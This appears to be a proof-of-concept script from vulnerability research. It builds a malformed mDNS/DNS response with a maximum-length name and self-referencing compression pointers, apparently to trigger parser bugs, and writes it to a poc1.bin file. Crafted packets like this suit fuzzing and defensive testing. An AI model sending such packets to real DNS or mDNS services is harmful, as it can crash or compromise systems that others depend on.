import struct

def make_label(label_bytes):
    return bytes([len(label_bytes)]) + label_bytes

label_content = b'A' * 63
long_name = b''
for _ in range(4):
    long_name += make_label(label_content)
long_name += b'\x00'

print(f"Long name length: {len(long_name)} bytes")
print(f"Long name hex: {long_name[:10].hex()} ... {long_name[-10:].hex()}")

name_ptr = struct.pack('!H', 0xc000 | 12)
print(f"Name ptr: {name_ptr.hex()}")

msg = b''
id = 0
flags = 0x8400
qdcount = 0
ancount = 1  # Just 1 RR for debugging
nscount = 0
arcount = 0

msg += struct.pack('!H', id)
msg += struct.pack('!H', flags)
msg += struct.pack('!H', qdcount)
msg += struct.pack('!H', ancount)
msg += struct.pack('!H', nscount)
msg += struct.pack('!H', arcount)

msg += long_name

# One RR
msg += name_ptr  # Name: compression ptr to offset 12
msg += struct.pack('!H', 12)  # type PTR
msg += struct.pack('!H', 0x8001)  # class IN with cache flush
msg += struct.pack('!I', 0)  # TTL = 0
msg += struct.pack('!H', 2)  # rdlength
msg += name_ptr  # rdata: compression pointer

print(f"Message size: {len(msg)} bytes")
print(f"Offset 12 value: {msg[12]:#x}")
print(f"Offset 12+1 to 12+63: {msg[13:13+5].hex()}...")

with open('/workspace/poc1.bin', 'wb') as f:
    f.write(msg)
print("Written to /workspace/poc1.bin")
PYEOF
